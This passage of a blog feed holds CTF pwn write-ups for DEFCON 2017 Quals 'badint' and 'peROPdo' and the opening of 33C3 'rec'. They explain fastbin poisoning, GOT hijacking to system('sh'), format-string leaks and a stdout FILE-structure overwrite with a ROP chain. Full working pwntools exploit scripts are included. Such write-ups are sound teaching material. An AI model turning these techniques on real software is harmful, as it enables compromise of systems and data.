&lt;dlsym@got.plt+2&gt;:     0x0ba6000000000040      0x0bb6000000000040 &lt;-- and here !</span><br></pre></td></tr></table></figure></p><p>While allocating a fastbin chunk, <strong>malloc.c will only check if its size is valid</strong>. For example, a chunk in <code>fastbin[2]</code> must have a size of <code>0x4X</code> ( yep, even a size of <code>0x4f</code> will still pass the check). So, after we overwrite the <code>fd</code> pointer in the chunk @ <code>fastbin[2]</code>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ hip</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x1da3cc0 --&gt; 0x0</span><br><span class="line">(0x40)     fastbin[2]: 0x1da3c80 --&gt; 0x604042 (size error (0xc740000000000040)) --&gt; 0x9ad000007f5e059a (invaild memory)</span><br><span class="line">(0x50)     fastbin[3]: 0x0</span><br><span class="line">(0x60)     fastbin[4]: 0x1da3c20 --&gt; 0x0</span><br><span class="line">(0x70)     fastbin[5]: 0x0</span><br><span class="line">(0x80)     fastbin[6]: 0x0</span><br><span class="line">                  top: 0x1da3f80 (size : 0x1c080) </span><br><span class="line">       last_remainder: 0x1da3e00 (size : 0x50) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure></p><p>We could see that <code>fastbin[2]</code> will have a fake chunk @ <code>0x604042</code> ( no need to worry about the size, <strong>malloc.c</strong> will only check the size with type <code>unsigned int</code> , just focus on the first 4 bytes ).  </p><p>Later we could just allocate the chunk in <code>fastbin[2]</code>. Once we allocate <code>0x604042</code>, we’ll be able to overwrite the GOT entry by copying our data into the fake fastbin chunk.  </p><p>But there’s one more problem: we don’t know the version of the libc. The libc address we leaked is the address of <code>main_arena+88</code>, neither <a href="https://github.com/niklasb/libc-database" target="_blank" rel="noopener">libc-database</a> nor <a href="http://libcdb.com/" target="_blank" rel="noopener">libcdb.com</a> can find the libc version with this symbol’s address. </p><p>So we’ll have to leak more addresses. However, although we can modify a function’s GOT, there’s no way we can store a GOT entry’s address in the function parameter. Luckily, I still managed to figure out the solution: <strong>by using the format string vulnerability.</strong>  </p><p>We could modify <code>atol@got.plt</code> into <code>printf@got.plt</code>, which will turn <code>atol(our_input)</code> into <code>printf(our_input)</code>, <strong>thus we create a format string vulnerability, and we can use the vulnerability to leak an arbitrary address.</strong> By doing this, I was able to leak some GOT entries and found the correct version of libc at <a href="http://libcdb.com/" target="_blank" rel="noopener">libcdb.com</a>. After that is simple, we could just hijack <code>atol</code>‘s GOT and call <code>system(&#39;sh&#39;)</code> by entering “sh”.  </p><figure class="highlight python"><figcaption><span>exp_bad.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"badint_7312a689cf32f397727635e8be495322.quals.shallweplayaga.me"</span></span><br><span class="line">PORT = <span class="number">21813</span></span><br><span class="line">ELF_PATH = <span class="string">"./badint"</span></span><br><span class="line"><span class="comment">#LIBC_PATH = "/lib/x86_64-linux-gnu/libc.so.6"</span></span><br><span class="line">LIBC_PATH = <span class="string">"./libc-2.19_15.so"</span></span><br><span class="line"></span><br><span class="line">context.binary = ELF_PATH</span><br><span class="line">context.log_level = <span class="string">'INFO'</span> <span class="comment"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>] <span class="comment"># for gdb.attach</span></span><br><span class="line"></span><br><span class="line">elf = context.binary <span class="comment"># context.binary is an ELF object</span></span><br><span class="line">libc = ELF(LIBC_PATH)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_data</span><span class="params">(seq, off, data, lsf)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">"SEQ #:"</span>, str(seq))</span><br><span class="line">    r.sendlineafter(<span class="string">"Offset: "</span>, str(off))</span><br><span class="line">    r.sendlineafter(<span class="string">"Data: "</span>, data)</span><br><span class="line">    r.sendlineafter(<span class="string">"Yes/No: "</span>, lsf)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convert</span><span class="params">(num)</span>:</span></span><br><span class="line">    ret = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> num != <span class="number">0</span>:</span><br><span class="line">        now = num &amp; <span class="number">0xff</span></span><br><span class="line">        num &gt;&gt;= <span class="number">8</span></span><br><span class="line">        ret = ret + <span class="string">'&#123;:02x&#125;'</span>.format(now)</span><br><span class="line">    <span class="keyword">return</span> ret.ljust(<span class="number">16</span>, <span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    </span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = process(ELF_PATH)</span></span><br><span class="line">    </span><br><span class="line">    add_data(<span class="number">1</span>, <span class="number">8</span>, <span class="string">"1"</span>*<span class="number">0x90</span>*<span class="number">2</span>, <span class="string">'Yes'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">"Assembled [seq: 1]: "</span>)</span><br><span class="line">    <span class="comment"># leak libc address</span></span><br><span class="line">    addr = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">6</span>):</span><br><span class="line">        addr |= ((int(r.recv(<span class="number">2</span>), <span class="number">16</span>)) &lt;&lt; (i*<span class="number">8</span>))</span><br><span class="line">    </span><br><span class="line">    log.success(<span class="string">"addr: "</span> +hex(addr))</span><br><span class="line">    <span class="comment"># libc.address = addr - 0x3c3b78 # local</span></span><br><span class="line">    libc.address = addr - <span class="number">0x3be7b8</span> <span class="comment"># remote</span></span><br><span class="line">    log.success(<span class="string">"libc_base: "</span> +hex(libc.address))</span><br><span class="line">    <span class="comment"># gdb.attach(r, gdbscript=open('./ggg', 'r'))</span></span><br><span class="line">    <span class="comment"># arrange heap</span></span><br><span class="line">    add_data(<span class="number">2</span>, <span class="number">0</span>, <span class="string">"2"</span>*<span class="number">0xb0</span>*<span class="number">2</span>, <span class="string">'Yes'</span>)</span><br><span class="line">    add_data(<span class="number">2</span>, <span class="number">0</span>, <span class="string">"3"</span>*<span class="number">0x58</span>*<span class="number">2</span>, <span class="string">'Yes'</span>)</span><br><span class="line">    add_data(<span class="number">2</span>, <span class="number">0</span>, <span class="string">"4"</span>*<span class="number">0x38</span>*<span class="number">2</span>, <span class="string">'Yes'</span>)</span><br><span class="line">    <span class="comment"># overwrite fastbin-&gt;fd ( in size 0x40 )</span></span><br><span class="line">    payload = convert(<span class="number">0x41</span>)</span><br><span class="line">    payload += convert(<span class="number">0x604042</span>)</span><br><span class="line">    payload += convert(<span class="number">0</span>) * <span class="number">6</span></span><br><span class="line">    payload += convert(<span class="number">0x31</span>)</span><br><span class="line">    payload = payload.ljust(<span class="number">0x58</span>*<span class="number">2</span>, <span class="string">'0'</span>)</span><br><span class="line">    add_data(<span class="number">2</span>, <span class="number">0x60</span><span class="number">-0x8</span>, payload, <span class="string">'Yes'</span>)</span><br><span class="line">    <span class="comment"># now fastbin (size=0x40) has fake chunk @ got</span></span><br><span class="line">    <span class="comment"># allocate the fake chunk</span></span><br><span class="line">    <span class="comment"># overwrite got</span></span><br><span class="line">    payload = <span class="string">"6"</span>*<span class="number">12</span> <span class="comment"># libc_start_main</span></span><br><span class="line">    payload += convert(<span class="number">0x400b26</span>) <span class="comment"># resolve fgets</span></span><br><span class="line">    payload += convert(<span class="number">0x400b36</span>) <span class="comment"># resolve strlen</span></span><br><span class="line">    payload += convert(libc.symbols[<span class="string">'system'</span>]) <span class="comment"># hijack atol</span></span><br><span class="line">    <span class="comment">#payload += convert(elf.plt['printf']) # use format string to leak libc info</span></span><br><span class="line">    payload = payload.ljust(<span class="number">110</span>, <span class="string">'0'</span>)</span><br><span class="line">    add_data(<span class="number">3</span>, <span class="number">8</span>, payload, <span class="string">'No'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># hijack atol, send "sh" to get shell</span></span><br><span class="line">    r.sendlineafter(<span class="string">"SEQ #:"</span>, <span class="string">"sh"</span>)</span><br><span class="line">    log.success(<span class="string">"get shell!: "</span>)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># for exploiting format string &amp; leak libc info</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    payload = "%10$s.%p.%p.%p.%p.%p.%p.%p.%p.%p" + p64(elf.got['fgets'])</span></span><br><span class="line"><span class="string">    r.sendlineafter("SEQ #:", payload)</span></span><br><span class="line"><span class="string">    r.recv(1)</span></span><br><span class="line"><span class="string">    print "fgets:", hex(u64(r.recv(6).ljust(8, '\x00')))</span></span><br><span class="line"><span class="string">    payload = "%10$s.%p.%p.%p.%p.%p.%p.%p.%p.%p" + p64(elf.got['puts'])</span></span><br><span class="line"><span class="string">    r.sendlineafter("Offset:", payload)</span></span><br><span class="line"><span class="string">    r.recv(1)</span></span><br><span class="line"><span class="string">    print "puts:", hex(u64(r.recv(6).ljust(8, '\x00')))</span></span><br><span class="line"><span class="string">    """</span></span><br></pre></td></tr></table></figure><p>flag: <code>All ints are not the same... A239... Some can be bad ints!</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; Potent Pwnables&lt;/p&gt;
&lt;p&gt;64 bit ELF, Partial RELRO, NX enabled, No canary &amp;amp; PIE. &lt;strong&gt;libc not provided&lt;/strong&gt;. &lt;/p&gt;
    
    </summary>
    
      <category term="write-ups" scheme="https://bruce30262.github.io/categories/write-ups/"/>
    
    
      <category term="CTF" scheme="https://bruce30262.github.io/tags/CTF/"/>
    
      <category term="Pwnable" scheme="https://bruce30262.github.io/tags/Pwnable/"/>
    
      <category term="Python" scheme="https://bruce30262.github.io/tags/Python/"/>
    
      <category term="CPP" scheme="https://bruce30262.github.io/tags/CPP/"/>
    
      <category term="heap" scheme="https://bruce30262.github.io/tags/heap/"/>
    
      <category term="DEFCON" scheme="https://bruce30262.github.io/tags/DEFCON/"/>
    
      <category term="heap_overflow" scheme="https://bruce30262.github.io/tags/heap-overflow/"/>
    
  </entry>
  
  <entry>
    <title>DEFCON CTF 2017 Quals -- peROPdo</title>
    <link href="https://bruce30262.github.io/2017/05/02/2017-05-02-1784510/"/>
    <id>https://bruce30262.github.io/2017/05/02/2017-05-02-1784510/</id>
    <published>2017-05-02T06:58:00.000Z</published>
    <updated>2018-01-03T15:08:05.599Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Category:</strong> Potent Pwnables</p><p>32 bit ELF, static link, stripped, NX enabled, No PIE &amp; canary.  </p><a id="more"></a><p>The program is a “rolling dice” program. First we input our name, then the program will ask us how many dice would we like to roll. After we input a number, the program will start generating some random data, then store them on the stack memory. The program will then print out <code>data[i] % 6 + 1</code>, which represent the numbers we roll in this round. </p><p>There’re two vulnerabilities in the program. First it use <code>scanf(&quot;%s&quot;, name)</code> to read our name, which lead to buffer overflow in the <code>name</code> buffer. Then, if we input a number that is larger than <strong>23</strong>, the data that program generated will overflow the <code>data[i]</code> buffer and <strong>thus overwrite the return address</strong> ( it will be a random data though ).  </p><p>Since the binary was stripped, I wasn’t sure which algorithm the program used for randomizing, the only thing I knew is that the algorithm will use our name to generate the random data. At that moment, I thought it was just some self-implement function ( which is <strong>NOT</strong> correct, we’ll get into that later).  </p><p>And so I thought “Hmmm, maybe I could use some symbolic execution tool to calculate the address I want to return, and do the ROP attack”. <strong>This was such a huge mistake</strong>, since I’m not familiar with any of the symbolic execution tools – <a href="http://angr.io/" target="_blank" rel="noopener">angr</a>, <a href="https://github.com/JonathanSalwan/Triton" target="_blank" rel="noopener">Triton</a>, not to mention the fresh out <a href="https://github.com/trailofbits/manticore" target="_blank" rel="noopener">manticore</a>. Even worse, all of the tool failed to calculate the address – Triton and manticore couldn’t even execute the program, it just crashed :(  </p><p>After wasting lots of time with those symbolic execution tools, I decided to try something different – the first vulnerability: overflowing the <code>name</code> buffer. And the result was encouraging – since I found that I could hijack the control flow by using the <code>call reg</code> and the <code>call [reg+offset]</code> gadget ( we can control the content of several registers ). It seems that there’re some <code>FILE*</code> pointer behind the <code>name</code> buffer, so we can exploit the service by <a href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/" target="_blank" rel="noopener">abusing the FILE structure</a> ( we can’t control the function parameters though). </p><p>Here I chose to use the second gadget ( <code>call [reg+offset]</code> ), since when the program execute to that line of code, its second parameter will be the <code>FILE*</code> pointer of <code>stdout</code>. I control the <code>eip</code> and jump to the middle of the main function:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     dword ptr [esp+4], offset name</span><br><span class="line">mov     dword ptr [esp], (offset aSSSS+8) ; &quot;%s&quot; &lt;--- I jump to here</span><br><span class="line">call    scanf</span><br><span class="line">mov     eax, ds:name</span><br><span class="line">mov     [esp], eax</span><br><span class="line">call    sub_0804baf0</span><br><span class="line">mov     dword ptr [esp], offset name</span><br><span class="line">call    do_main</span><br></pre></td></tr></table></figure></p><p>This will make the program store the <code>%s</code> string to the first parameter, then call the <code>scanf</code> function, making the program calling <code>scanf(&quot;%s&quot;, stdout)</code> – and thus we can control the content of <code>stdout</code> !</p><p>By crafting <code>stdout</code>, we can actually hijack the control flow, while having the first parameter controlled. This allowed us to do some advanced ROP attack. Here’s what I did after I controlled the <code>eip</code>:  </p><ol><li>Jump to <code>xchg esp, eax</code> gadget, migrate the stack to <code>stdout</code> (which now controlled by us)  </li><li>Use <code>add esp, offset</code> to skip the uncontrollable member data in <code>stdout</code>  </li><li>Since it’s a static linked binary, it’s easy for us to find some gadgets and do the <strong>open/read/write</strong> syscall, making the service print out the flag of the challenge. (The <strong>execve</strong> syscall seems to be filtered out in this challenge)  </li></ol><p>Final exploit:<br><figure class="highlight python"><figcaption><span>exp_peropdo.py </span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">"peropdo_bb53b90b35dba86353af36d3c6862621.quals.shallweplayaga.me"</span></span><br><span class="line">PORT = <span class="number">80</span></span><br><span class="line">ELF_PATH = <span class="string">"./peropdo"</span></span><br><span class="line"></span><br><span class="line">context.binary = ELF_PATH</span><br><span class="line">context.log_level = <span class="string">'INFO'</span> <span class="comment"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>] <span class="comment"># for gdb.attach</span></span><br><span class="line"></span><br><span class="line">elf = context.binary <span class="comment"># context.binary is an ELF object</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = process(ELF_PATH)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">#gdb.attach(r, gdbscript=open("./ggg", "r"))</span></span><br><span class="line">    func = <span class="number">0x0806d7aa</span> <span class="comment"># avoid crash</span></span><br><span class="line">    scanf = <span class="number">0x08048b2a</span></span><br><span class="line">    name = p32(scanf) + p32(func) + <span class="string">"\x42"</span>*<span class="number">972</span> + p32(<span class="number">0x80ecdf4</span>) + <span class="string">'\x00'</span>*<span class="number">92</span>  + p32(<span class="number">0x80ecdf8</span>) </span><br><span class="line">    r.sendlineafter(<span class="string">"name?"</span>, name)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Later the program will call scanf("%s", stdout);</span></span><br><span class="line">    <span class="comment"># now we can overwrite the whole stdout FILE structure</span></span><br><span class="line"></span><br><span class="line">    stream = p32(<span class="number">0x08079824</span>) <span class="comment"># second gadget: add esp, 0x84....</span></span><br><span class="line">    stream += <span class="string">"/home/peropdo/flag\x00"</span> <span class="comment"># flag path</span></span><br><span class="line">    stream = stream.ljust(<span class="number">0x1c</span>, <span class="string">'\0'</span>)</span><br><span class="line">    stream += p32(<span class="number">0x804b45c</span>) <span class="comment"># eip, first gadget: xchg esp, eax ; ret</span></span><br><span class="line">    stream = stream.ljust(<span class="number">0x48</span>, <span class="string">'\0'</span>)</span><br><span class="line">    stream += p32(<span class="number">0x080ED3E8</span>) <span class="comment"># pointer to null</span></span><br><span class="line">    stream = stream.ljust(<span class="number">0x90</span>, <span class="string">'\0'</span>)</span><br><span class="line">    stream += p32(<span class="number">0x807982b</span>) <span class="comment"># third gadget: pop; ret</span></span><br><span class="line">    stream += p32(<span class="number">0x80eb2a0</span>) <span class="comment"># fake jump table</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 0x08074f2e : mov eax, 5 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret </span></span><br><span class="line">    <span class="comment"># 0x08079465 : mov ebx, eax ; mov eax, ebx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span></span><br><span class="line">    pop_ebx = <span class="number">0x806f322</span>  <span class="comment"># pop ebx;ret</span></span><br><span class="line">    pop_eax = <span class="number">0x80e3525</span>  <span class="comment"># pop eax;ret</span></span><br><span class="line">    pop_ecx = <span class="number">0x080e5ee1</span> <span class="comment"># pop ecx ; ret </span></span><br><span class="line">    pop_edx = <span class="number">0x0806f2fa</span> <span class="comment"># pop edx ; ret</span></span><br><span class="line">    int80 = <span class="number">0x806fae0</span>    <span class="comment"># int 0x80 ; ret </span></span><br><span class="line">    buf = <span class="number">0x80ed000</span><span class="number">-0x100</span></span><br><span class="line">    rop = flat(</span><br><span class="line">                pop_ecx,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                pop_edx, </span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="number">0x08074f2e</span>, <span class="comment"># mov eax = 5 (open), pop ebx...</span></span><br><span class="line">                <span class="number">0x80eb2a4</span>, <span class="comment"># ptr to flag path</span></span><br><span class="line">                [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>],</span><br><span class="line">                int80,              </span><br><span class="line">                pop_eax,</span><br><span class="line">                <span class="number">3</span>, <span class="comment"># read</span></span><br><span class="line">                pop_ebx,</span><br><span class="line">                <span class="number">3</span>, <span class="comment">#fd</span></span><br><span class="line">                pop_ecx,</span><br><span class="line">                buf,</span><br><span class="line">                pop_edx,</span><br><span class="line">                <span class="number">0x100</span>,</span><br><span class="line">                int80,</span><br><span class="line">                pop_ebx,</span><br><span class="line">                <span class="number">1</span>, <span class="comment"># fd,</span></span><br><span class="line">                pop_eax,</span><br><span class="line">                <span class="number">4</span>, <span class="comment"># write</span></span><br><span class="line">                int80</span><br><span class="line">              )</span><br><span class="line"></span><br><span class="line">    r.sendline(stream + rop)</span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure></p><p>flag: <code>Thanks to Kenshoto for the inspiration! 5fbb34920c457b2e0855a174b8de3ebc</code>  </p><p>Later did I know (thanks to teammate <a href="https://poning.me/" target="_blank" rel="noopener">Isaac</a>) that there’s a thing call <a href="https://www.hex-rays.com/products/ida/tech/flirt/index.shtml" target="_blank" rel="noopener">FLIRT</a> in IDA Pro, which can help the user identify the function call in libc. All we need to do is download a FLIRT signature database from github ( <a href="https://github.com/push0ebp/sig-database" target="_blank" rel="noopener">here’s</a> the DB I used for this challenge ), and use <strong>FILE –&gt; Load File –&gt; FLIRT signature file</strong> to load the database. IDA will then identify the function name, making the reverse engineering less painful. By using this technique, we’ll be able to identify some libc function, even the location of <code>stdout</code>.  </p><p>And that’s when I found that the “self-implement random” function is actually just <code>srand()</code> &amp; <code>rand()</code> in libc. According to <a href="https://github.com/mehQQ" target="_blank" rel="noopener">meh</a> from HITCON, you can just brute-force the desired return address. Moreover, because the <code>name</code> buffer address is right under the return address, so you can just use <code>pop esp; ret</code> to migrate the stack into <code>name</code> buffer, and do the ROP attack. Guess I still got a lot of shit to learn :/</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; Potent Pwnables&lt;/p&gt;
&lt;p&gt;32 bit ELF, static link, stripped, NX enabled, No PIE &amp;amp; canary.  &lt;/p&gt;
    
    </summary>
    
      <category term="write-ups" scheme="https://bruce30262.github.io/categories/write-ups/"/>
    
    
      <category term="CTF" scheme="https://bruce30262.github.io/tags/CTF/"/>
    
      <category term="Pwnable" scheme="https://bruce30262.github.io/tags/Pwnable/"/>
    
      <category term="Python" scheme="https://bruce30262.github.io/tags/Python/"/>
    
      <category term="C" scheme="https://bruce30262.github.io/tags/C/"/>
    
      <category term="BOF" scheme="https://bruce30262.github.io/tags/BOF/"/>
    
      <category term="DEFCON" scheme="https://bruce30262.github.io/tags/DEFCON/"/>
    
      <category term="ROP" scheme="https://bruce30262.github.io/tags/ROP/"/>
    
      <category term="file_stream_pointer_overflow" scheme="https://bruce30262.github.io/tags/file-stream-pointer-overflow/"/>
    
  </entry>
  
  <entry>
    <title>33C3 CTF 2016 -- rec</title>
    <link href="https://bruce30262.github.io/2016/12/30/2016-12-30-33c3-ctf-2016-rec/"/>
    <id>https://bruce30262.github.io/2016/12/30/2016-12-30-33c3-ctf-2016-rec/</id>
    <published>2016-12-29T17:38:00.000Z</published>
    <updated>2018-01-03T15:08:05.599Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Category:</strong> pwn<br><strong>Points:</strong> 200</p><a id="more"></a>  <p>32 bit ELF, with all the protection enabled.</p><p>program menu:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ ./rec </span><br><span class="line">Calculators are fun!</span><br><span class="line">0 - Take note</span><br><span class="line">1 - Read note</span><br><span class="line">2 - Polish</span><br><span class="line">3 - Infix</span><br><span class="line">4 - Reverse Polish</span><br><span class="line">5 - Sign</span><br><span class="line">6 - Exit</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></p><ul><li>Take note: input a note</li><li>Read note: output the note</li><li>Polish: do the <code>sum</code> operation or the elementary arithmetic (prefix expression)</li><li>Infix: do the elementary arithmetic (infix expression)</li><li>Reverse Polish: do the elementary arithmetic (postfix expression)</li><li>Sign: input a number and see if it is a positive/negative number</li></ul><p>First we found that the <code>Read note</code> function doesn’t work well:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$ ./rec </span><br><span class="line">Calculators are fun!</span><br><span class="line">0 - Take note</span><br><span class="line">1 - Read note</span><br><span class="line">2 - Polish</span><br><span class="line">3 - Infix</span><br><span class="line">4 - Reverse Polish</span><br><span class="line">5 - Sign</span><br><span class="line">6 - Exit</span><br><span class="line">&gt; 0</span><br><span class="line">Your note: 123</span><br><span class="line">0 - Take note</span><br><span class="line">1 - Read note</span><br><span class="line">2 - Polish</span><br><span class="line">3 - Infix</span><br><span class="line">4 - Reverse Polish</span><br><span class="line">5 - Sign</span><br><span class="line">6 - Exit</span><br><span class="line">&gt; 1</span><br><span class="line">Your note:�VXV`�s��`XV     &lt;-- WTF?</span><br></pre></td></tr></table></figure></p><p>This is because the program use a stack address as the <code>note</code>‘s buffer. After we take a note and leave the function, the buffer will be filled with some (useful) addresses (due to the function epilogue). And because of this, we’re able to leak the stack address &amp; text’s base address.</p><p>Now it’s time to try controlling the EIP. There’s a program logic vulnerability in the <code>sign</code> function:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( num &lt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( num &lt; <span class="number">0</span> )</span><br><span class="line">    v1 = (<span class="keyword">void</span> (*)(<span class="keyword">void</span>))puts_negative;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v1 = (<span class="keyword">void</span> (*)(<span class="keyword">void</span>))puts_positive;</span><br><span class="line">&#125;</span><br><span class="line">v1();</span><br></pre></td></tr></table></figure></p><p>It handles both positive &amp; negative numbers. <strong>But what about <code>0</code></strong> ?<br><figure class="highlight plain"><table><tr><td 